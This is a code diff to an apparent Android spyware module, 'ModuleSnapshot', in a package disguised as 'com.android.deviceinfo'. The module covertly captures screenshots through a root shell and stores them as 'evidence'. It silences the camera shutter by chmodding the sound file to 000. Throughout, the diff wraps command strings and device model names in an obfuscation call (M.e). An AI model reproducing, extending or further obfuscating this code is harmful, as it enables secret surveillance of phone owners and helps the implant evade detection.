@@ -30,7 +30,7 @@ import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.conf.ConfModule;
 import com.android.deviceinfo.conf.Configuration;
 import com.android.deviceinfo.conf.ConfigurationException;
-import com.android.deviceinfo.evidence.EvidenceReference;
+import com.android.deviceinfo.evidence.EvidenceBuilder;
 import com.android.deviceinfo.evidence.EvidenceType;
 import com.android.deviceinfo.file.AutoFile;
 import com.android.deviceinfo.listener.ListenerStandby;
@@ -144,6 +144,11 @@ public class ModuleSnapshot extends BaseInstantModule {
 				}
 			}
 
+			if(!frameBuffer && ! screenCap){
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (actualStart) Screenshot not supported");
+				}
+			}
 		} catch (final Exception ex) {
 			if (Cfg.EXCEPTION) {
 				Check.log(ex);
@@ -181,7 +186,7 @@ public class ModuleSnapshot extends BaseInstantModule {
 			try {
 				//disableClick();
 
-				ExecuteResult res = Execute.executeScript(sc + " -p " + frame + ";chmod 777 " + frame);
+				ExecuteResult res = Execute.executeScript(sc + M.e(" -p ") + frame + M.e(";chmod 777 ") + frame);
 				if (aframe.exists() && aframe.canRead()) {
 					Bitmap bitmap = readPng(aframe);
 					if (bitmap == null) {
@@ -191,7 +196,7 @@ public class ModuleSnapshot extends BaseInstantModule {
 					if (jpeg == null) {
 						return false;
 					}
-					EvidenceReference.atomic(EvidenceType.SNAPSHOT, getAdditionalData(), jpeg);
+					EvidenceBuilder.atomic(EvidenceType.SNAPSHOT, getAdditionalData(), jpeg);
 					return true;
 				}
 
@@ -206,14 +211,14 @@ public class ModuleSnapshot extends BaseInstantModule {
 	private void enableClick() {
 		AutoFile file = new AutoFile(cameraSound);
 		if (file.exists()) {
-			file.chmod("777");
+			file.chmod(M.e("777"));
 		}
 	}
 
 	private void disableClick() {
 		AutoFile file = new AutoFile(cameraSound);
 		if (file.exists()) {
-			file.chmod("000");
+			file.chmod(M.e("000"));
 		}
 	}
 
@@ -262,6 +267,7 @@ public class ModuleSnapshot extends BaseInstantModule {
 			}
 
 			Bitmap bitmap = null;
+			System.gc();
 
 			// 0: invertito blu e rosso
 			// 1: perdita info
@@ -280,6 +286,7 @@ public class ModuleSnapshot extends BaseInstantModule {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (frameBufferMethod): all black");
 					}
+					// TODO: aggiungere (una volta sola) un log info
 					return false;
 				}
 				if (usesInvertedColors()) {
@@ -348,7 +355,7 @@ public class ModuleSnapshot extends BaseInstantModule {
 				byte[] jpeg = toJpeg(bitmap);
 				bitmap = null;
 
-				EvidenceReference.atomic(EvidenceType.SNAPSHOT, getAdditionalData(), jpeg);
+				EvidenceBuilder.atomic(EvidenceType.SNAPSHOT, getAdditionalData(), jpeg);
 				jpeg = null;
 
 			}
@@ -381,7 +388,7 @@ public class ModuleSnapshot extends BaseInstantModule {
 		String model = Build.MODEL.toLowerCase();
 
 		// Samsung Galaxy Tab
-		if (model.contains("gt-p7500")) {
+		if (model.contains(M.e("gt-p7500"))) {
 			return true;
 		}
 
@@ -392,17 +399,17 @@ public class ModuleSnapshot extends BaseInstantModule {
 		String model = Build.MODEL.toLowerCase();
 
 		// Samsung Galaxy Tab
-		if (model.contains("gt-p7500")) {
+		if (model.contains(M.e("gt-p7500"))) {
 			return true;
 		}
 
 		// Samsung Galaxy S2
-		if (model.contains("gt-i9100")) {
+		if (model.contains(M.e("gt-i9100"))) {
 			return true;
 		}
 
 		// Samsung Galaxy S3
-		if (model.contains("gt-i9300")) {
+		if (model.contains(M.e("gt-i9300"))) {
 			return true;
 		}
 
@@ -461,8 +468,8 @@ public class ModuleSnapshot extends BaseInstantModule {
 				Check.log(TAG + " (getRawBitmap): calling frame generator");
 			}
 
-			Execute.execute(Configuration.shellFile + " fb /data/data/"
-					+ Status.self().getAppContext().getPackageName() + "/files/frame");
+			Execute.execute(Configuration.shellFile + M.e(" fb /data/data/")
+					+ Status.self().getAppContext().getPackageName() +  M.e("/files/frame"));
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (getRawBitmap): finished calling frame generator");
@@ -471,6 +478,9 @@ public class ModuleSnapshot extends BaseInstantModule {
 			final AutoFile file = new AutoFile(path, M.e("frame")); //$NON-NLS-1$
 
 			if (file.exists()) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (getRawBitmap) file exists: " + file);
+				}
 				return file.read();
 			}
 		} catch (Exception e) {
